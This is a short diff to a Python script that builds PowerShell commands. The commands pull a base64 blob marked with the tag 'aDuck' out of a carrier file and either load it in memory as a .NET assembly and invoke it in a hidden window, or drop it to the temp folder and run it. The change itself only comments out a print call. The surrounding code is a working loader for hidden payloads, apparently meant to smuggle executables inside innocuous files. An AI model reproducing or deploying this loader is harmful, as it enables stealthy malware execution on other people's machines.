@@ -39,7 +39,7 @@ if __name__ == '__main__':
     if args.net:
         BASE = '''start-process powershell -ArgumentList "-WindowStyle hidden -c `"`$b64 = @(Select-String -Pattern `"aDuck`" -Path .\{}).Line -replace 'aDuck';`$bytes = [System.Convert]::FromBase64String(`$b64);`$assembly = [System.Reflection.Assembly]::Load(`$bytes);`$assembly.EntryPoint.Invoke(`$null, @(`$null));`""'''
         command: str = BASE.format(filename)
-        print(command)
+        # print(command)
     else:
         BASE = '''$b64 = @(Select-String -Pattern "aDuck" -Path .\{}).Line -replace 'aDuck';Set-Content $env:temp\{} -Encoding Byte -Value @([System.Convert]::FromBase64String($b64)); invoke-item $env:temp\{}'''
         command: str = BASE.format(filename, args.temp, args.temp)
